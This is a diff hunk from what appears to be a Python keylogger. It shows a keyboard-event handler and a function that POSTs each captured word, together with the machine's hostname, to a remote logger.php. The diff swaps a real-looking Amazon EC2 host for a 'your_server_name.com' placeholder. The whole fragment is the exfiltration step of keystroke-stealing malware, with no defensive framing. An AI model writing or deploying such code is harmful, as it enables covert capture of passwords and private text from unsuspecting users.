@@ -20,7 +20,7 @@ hostname = platform.node()
 def postRequest(param):
   global hostname
   payload = {'word' : param, 'hostname' : hostname}
-  r = requests.post('http://ec2-13-127-19-135.ap-south-1.compute.amazonaws.com/httplib/post/logger.php',data=payload)
+  r = requests.post('http://your_server_name.com/httplib/post/logger.php',data=payload)
 
 def OnKeyboardEvent(event):
   global flag
